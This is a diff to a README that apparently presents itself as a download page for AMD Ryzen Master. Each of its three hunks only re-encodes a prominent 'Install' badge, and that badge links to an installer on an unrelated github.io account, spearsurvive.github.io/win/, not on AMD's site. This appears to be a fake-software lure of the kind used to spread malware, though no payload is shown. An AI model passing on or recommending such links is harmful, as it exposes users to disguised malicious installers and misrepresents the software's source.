@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install AMD Ryzen Master](https://img.shields.io/badge/⬇_Install_AMD%20Ryzen%20Master-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install AMD Ryzen Master](https://img.shields.io/badge/⬇_Install_AMD+Ryzen+Master-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ AMD Ryzen Master is the official overclocking and monitoring utility for AMD Ryz
 
 <div align="center">
 
-[![⬇ Install AMD Ryzen Master](https://img.shields.io/badge/⬇_Install_AMD%20Ryzen%20Master-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install AMD Ryzen Master](https://img.shields.io/badge/⬇_Install_AMD+Ryzen+Master-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ AMD Ryzen Master is the official overclocking and monitoring utility for AMD Ryz
 
 <div align="center">
 
-[![⬇ Install AMD Ryzen Master](https://img.shields.io/badge/⬇_Install_AMD%20Ryzen%20Master-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install AMD Ryzen Master](https://img.shields.io/badge/⬇_Install_AMD+Ryzen+Master-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
